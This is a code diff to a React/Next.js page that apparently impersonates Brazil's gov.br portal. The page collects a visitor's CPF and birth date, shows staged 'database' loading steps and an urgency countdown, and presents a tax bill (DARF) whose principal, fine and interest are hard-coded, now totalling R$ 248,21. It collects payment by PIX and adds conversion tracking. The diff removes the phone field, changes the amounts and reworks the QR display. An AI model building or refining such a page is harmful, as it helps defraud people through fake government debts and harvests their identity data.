@@ -1,6 +1,6 @@
 "use client"
 
-import type React from "react"
+import React from "react"
 
 import { Card, CardContent } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
@@ -20,6 +20,13 @@ import {
 } from "lucide-react"
 import { useState, useEffect } from "react"
 
+// Declaração de tipos para window.trackConversion
+declare global {
+  interface Window {
+    trackConversion?: (eventName: string, userData: any) => Promise<string | null>
+  }
+}
+
 type AppState =
   | "login"
   | "loading"
@@ -33,7 +40,6 @@ type AppState =
 export default function Home() {
   const [cpf, setCpf] = useState("")
   const [birthDate, setBirthDate] = useState("")
-  const [phone, setPhone] = useState("")
   const [appState, setAppState] = useState<AppState>("login")
   const [userData, setUserData] = useState<any>(null)
   const [loadingStep, setLoadingStep] = useState(0)
@@ -109,7 +115,7 @@ export default function Home() {
       const steps = ["Conectando com a base de dados", "Validando informações pessoais", "Preparando resultado"]
 
       const interval = setInterval(() => {
-        setLoadingStep((prev) => {
+        setLoadingStep((prev: number) => {
           if (prev < steps.length - 1) {
             return prev + 1
           } else {
@@ -127,7 +133,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "payment-processing") {
       const interval = setInterval(() => {
-        setPaymentStep((prev) => {
+        setPaymentStep((prev: number) => {
           if (prev < 2) {
             return prev + 1
           } else {
@@ -147,7 +153,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "payment-loading") {
       const interval = setInterval(() => {
-        setPaymentLoadingStep((prev) => {
+        setPaymentLoadingStep((prev: number) => {
           if (prev < 2) {
             return prev + 1
           } else {
@@ -162,13 +168,14 @@ export default function Home() {
                   body: JSON.stringify({
                     cpf: cpf,
                     name: userData?.name,
-                    phone: phone,
-                    amount: 263.23, // Valor total do DARF
+                    phone: "",
+                    email: "",
+                    amount: 248.21, // Valor total do DARF
                   }),
                 })
 
                 const pixResult = await response.json()
-                console.log("[v0] PIX generated:", pixResult)
+                console.log("[v0] FreePay PIX generated:", pixResult)
 
                 if (pixResult.success) {
                   setPixData(pixResult)
@@ -177,10 +184,35 @@ export default function Home() {
                   
                   // Log do QR code gerado
                   console.log("[v0] PIX transaction created successfully:")
+                  
+                  // Tracking de conversão UTMFY
+                  if (window.trackConversion) {
+                    try {
+                      const trackingData = {
+                        email: '', // Email não capturado
+                        phone: '',
+                        firstName: userData?.name?.split(' ')[0] || '',
+                        lastName: userData?.name?.split(' ').slice(1).join(' ') || '',
+                        city: 'São Paulo',
+                        state: 'SP',
+                        zip: '00000-000',
+                        country: 'BR',
+                        externalId: pixResult.transactionId || cpf
+                      };
+                      
+                      await window.trackConversion('InitiateCheckout', trackingData);
+                      console.log('[UTMFY] Evento InitiateCheckout enviado com sucesso');
+                    } catch (error) {
+                      console.error('[UTMFY] Erro ao enviar evento InitiateCheckout:', error);
+                    }
+                  }
                   console.log("[v0] Transaction ID:", pixResult.transactionId)
                   console.log("[v0] PIX Code:", pixResult.pixCode)
+                  console.log("[v0] PIX Code Length:", pixResult.pixCode?.length || 0)
                   console.log("[v0] QR Code Image:", pixResult.qrCodeImage)
+                  console.log("[v0] QR Code Image Length:", pixResult.qrCodeImage?.length || 0)
                   console.log("[v0] Amount:", pixResult.amount)
+                  console.log("[v0] Full PIX Result:", JSON.stringify(pixResult, null, 2))
                   
                 } else {
                   alert("Erro ao gerar PIX. Tente novamente.")
@@ -204,7 +236,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "pix-payment" && timeRemaining > 0) {
       const timer = setInterval(() => {
-        setTimeRemaining((prev) => {
+        setTimeRemaining((prev: number) => {
           if (prev <= 1) {
             clearInterval(timer)
             alert("Tempo para pagamento expirado!")
@@ -222,7 +254,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "result" && userData?.statusType === "CRÍTICO") {
       const interval = setInterval(() => {
-        setTimeLeft((prev) => {
+        setTimeLeft((prev: { hours: number; minutes: number; seconds: number }) => {
           if (prev.seconds > 0) {
             return { ...prev, seconds: prev.seconds - 1 }
           } else if (prev.minutes > 0) {
@@ -247,7 +279,7 @@ export default function Home() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ cpf, birthDate, phone }),
+        body: JSON.stringify({ cpf, birthDate, phone: "", email: "" }),
       })
 
       const result = await response.json()
@@ -307,15 +339,6 @@ export default function Home() {
     return limitedNumbers.replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2")
   }
 
-  const formatPhone = (value: string) => {
-    const numbers = value.replace(/\D/g, "")
-    const limitedNumbers = numbers.slice(0, 11)
-    if (limitedNumbers.length <= 10) {
-      return limitedNumbers.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{4})(\d)/, "$1-$2")
-    } else {
-      return limitedNumbers.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2")
-    }
-  }
 
   const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formattedValue = formatCPF(e.target.value)
@@ -327,14 +350,9 @@ export default function Home() {
     setBirthDate(formattedValue)
   }
 
-  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formattedValue = formatPhone(e.target.value)
-    setPhone(formattedValue)
-  }
 
   const handleSubmit = () => {
-    const phoneNumbers = phone.replace(/\D/g, "")
-    if (cpf.length === 14 && birthDate.length === 10 && phoneNumbers.length >= 10) {
+    if (cpf.length === 14 && birthDate.length === 10) {
       setLoadingStep(0)
       setAppState("loading")
     }
@@ -344,7 +362,6 @@ export default function Home() {
     setAppState("login")
     setCpf("")
     setBirthDate("")
-    setPhone("")
     setUserData(null)
     setLoadingStep(0)
   }
@@ -454,21 +471,28 @@ export default function Home() {
 
               <div className="flex flex-col items-center mb-6">
                 <div className="bg-white p-4 rounded-lg shadow-sm mb-4">
-                  {pixData?.qrCodeImage ? (
+                  {pixData?.pixCode ? (
                     <img
-                      src={pixData.qrCodeImage}
+                      src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixCode)}`}
                       alt="QR Code PIX"
-                      className="w-48 h-48"
-                      onError={(e) => {
+                      className="w-48 h-48 rounded-lg"
+                      onError={(e: React.SyntheticEvent<HTMLImageElement, Event>) => {
                         console.log("[v0] QR Code image failed to load, using fallback")
-                        e.currentTarget.src = `/placeholder.svg?height=200&width=200&query=QR Code PIX`
+                        e.currentTarget.style.display = 'none'
+                        const nextElement = e.currentTarget.nextElementSibling as HTMLElement
+                        if (nextElement) {
+                          nextElement.style.display = 'flex'
+                        }
                       }}
                     />
-                  ) : (
-                    <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded">
-                      <span className="text-gray-500 text-sm">QR Code não disponível</span>
+                  ) : null}
+                  <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded-lg" style={{ display: pixData?.pixCode ? 'none' : 'flex' }}>
+                    <div className="text-center text-gray-500">
+                      <div className="text-4xl mb-2">📱</div>
+                      <div className="text-sm">QR Code</div>
+                      <div className="text-xs">Use o código PIX abaixo</div>
                     </div>
-                  )}
+                  </div>
                 </div>
 
                 <div className="w-full max-w-md">
@@ -487,6 +511,13 @@ export default function Home() {
                       <Copy className="h-4 w-4" />
                     </button>
                   </div>
+                  <button
+                    onClick={copyPixCode}
+                    className="w-full mt-3 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 flex items-center justify-center space-x-2"
+                  >
+                    <Copy className="h-4 w-4" />
+                    <span>Copiar PIX</span>
+                  </button>
                 </div>
               </div>
 
@@ -506,14 +537,7 @@ export default function Home() {
                 </div>
               </div>
 
-              <div className="flex flex-col sm:flex-row gap-4">
-                <button
-                  onClick={() => setAppState("darf")}
-                  className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 flex items-center justify-center space-x-2"
-                >
-                  <FileText className="h-4 w-4" />
-                  <span>Gerar DARF</span>
-                </button>
+              <div className="flex justify-center">
                 <button
                   onClick={async () => {
                     if (pixData?.transactionId) {
@@ -524,6 +548,28 @@ export default function Home() {
                         if (result.success) {
                           if (result.status === 'paid') {
                             alert("✅ Pagamento confirmado! Sua regularização foi processada com sucesso.")
+                            
+                            // Tracking de conversão UTMFY - Purchase
+                            if (window.trackConversion) {
+                              try {
+                                const trackingData = {
+                                  email: '', // Email não capturado
+                                  phone: '',
+                                  firstName: userData?.name?.split(' ')[0] || '',
+                                  lastName: userData?.name?.split(' ').slice(1).join(' ') || '',
+                                  city: 'São Paulo',
+                                  state: 'SP',
+                                  zip: '00000-000',
+                                  country: 'BR',
+                                  externalId: pixData.transactionId || cpf
+                                };
+                                
+                                await window.trackConversion('Purchase', trackingData);
+                                console.log('[UTMFY] Evento Purchase enviado com sucesso');
+                              } catch (error) {
+                                console.error('[UTMFY] Erro ao enviar evento Purchase:', error);
+                              }
+                            }
                           } else {
                             alert(`Status do pagamento: ${result.status}. Aguarde a confirmação.`)
                           }
@@ -537,17 +583,10 @@ export default function Home() {
                       alert("ID da transação não encontrado.")
                     }
                   }}
-                  className="flex-1 px-6 py-3 border border-blue-300 text-blue-700 rounded-lg hover:bg-blue-50 flex items-center justify-center space-x-2"
+                  className="px-8 py-3 border border-blue-300 text-blue-700 rounded-lg hover:bg-blue-50 flex items-center justify-center space-x-2"
                 >
                   <RefreshCw className="h-4 w-4" />
                   <span>Verificar</span>
-                </button>
-                <button
-                  onClick={copyPixCode}
-                  className="flex-1 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 flex items-center justify-center space-x-2"
-                >
-                  <Copy className="h-4 w-4" />
-                  <span>Copiar PIX</span>
                 </button>
               </div>
 
@@ -633,10 +672,10 @@ export default function Home() {
   }
 
   if (appState === "darf") {
-    const valorPrincipal = 182.23 // Valor fixo
-    const multa = 29.55 // Multa fixa
-    const juros = 51.45 // Juros fixos
-    const valorTotal = valorPrincipal + multa + juros // Total: R$ 263,23
+    const valorPrincipal = 132.50 // Valor fixo
+    const multa = 42.00 // Multa fixa
+    const juros = 73.71 // Juros fixos
+    const valorTotal = valorPrincipal + multa + juros // Total: R$ 248,21
     const protocolo = `CTPS${userData?.cpf?.slice(-6) || '123456'}`
 
     return (
@@ -1431,25 +1470,12 @@ export default function Home() {
                 />
               </div>
 
-              <div>
-                <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
-                  <span className="text-red-500">*</span> Digite seu telefone:
-                </label>
-                <Input
-                  id="phone"
-                  type="text"
-                  placeholder="(11) 99999-9999"
-                  className="w-full h-12 text-center text-lg tracking-wider"
-                  value={phone}
-                  onChange={handlePhoneChange}
-                  inputMode="numeric"
-                />
-              </div>
+
 
               <Button
                 className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium"
                 onClick={handleSubmit}
-                disabled={cpf.length !== 14 || birthDate.length !== 10 || phone.replace(/\D/g, "").length < 10}
+                disabled={cpf.length !== 14 || birthDate.length !== 10}
               >
                 <span className="mr-2">→</span>
                 ENTRAR COM GOV.BR
